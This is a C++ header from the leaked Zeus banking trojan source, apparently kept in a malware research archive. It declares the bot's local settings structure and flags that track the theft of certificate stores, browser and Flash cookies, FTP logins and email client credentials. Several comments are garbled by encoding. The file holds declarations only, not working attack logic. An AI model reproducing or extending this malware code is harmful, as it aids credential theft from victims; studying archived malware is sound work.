/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���������� ���������� �����������.
  ����� �������� ��������� � �������� ��������� ������� � ������ ������.
*/
#pragma once

namespace LocalSettings
{
  //SETTINGS:: flags
  enum
  {
    FLAG_BOTNET = 0x1, //A botnet is installed.
  };

  //SETTINGS:: processStartupFlags
  enum
  {
    PSF_CERTSTORE_GRABBED      = 0x01, //Serifikaty received.
    PSF_MFP_GRAB               = 0x02, //Cookies need to get flash player.
    PSF_MFP_REMOVE             = 0x04, //You want to delete cookies flash player.
    PSF_SOFTWARE_FTP_GRABBED   = 0x08, //Logins from the FTP-clients received.
    PSF_COOKIES_GRABBED        = 0x10, //Browser cookies received.
    PSF_USER_DISABLED          = 0x20, //User disconnected.
    PSF_SOFTWARE_EMAIL_GRABBED = 0x40, //E-mails received from customers.
  };
  
# pragma pack(push, 1)  
  typedef struct
  {
    DWORD flags;                        //Flags FLAG_ *.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //The name of a botnet.
    DWORD processStartupFlags;          //Flags PSF_ *.
    WORD tcpPortS1;                     //The last port for S1.
    BYTE reserved[64];                  //Reserved for future use.
  }SETTINGS;
# pragma pack(pop)

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ������� �������� ��� ����������.

    OUT settings - ����� ��� ��������.
  */
  void getCurrent(SETTINGS *settings);
  
  /*
    ��������� ������� �������� � ����������� ������� ��� ������ ������� � ���������.

    OUT settings - ����� ��� ��������.

    Return       - true - �������� ���������, ������ ������������,
                   false - ��������� ������.
  */
  bool beginReadWrite(SETTINGS *settings);

  /*    Unlock established beginReadWrite () and save the changes.

    IN OUT settings - settings for the conservation, preservation, or NULL if not required. At the exit
                      buffer content is not suitable for use.
    
    Return - true - settings successfully saved,
                      false - the settings are not saved.
  */
  bool endReadWrite(SETTINGS *settings);
};
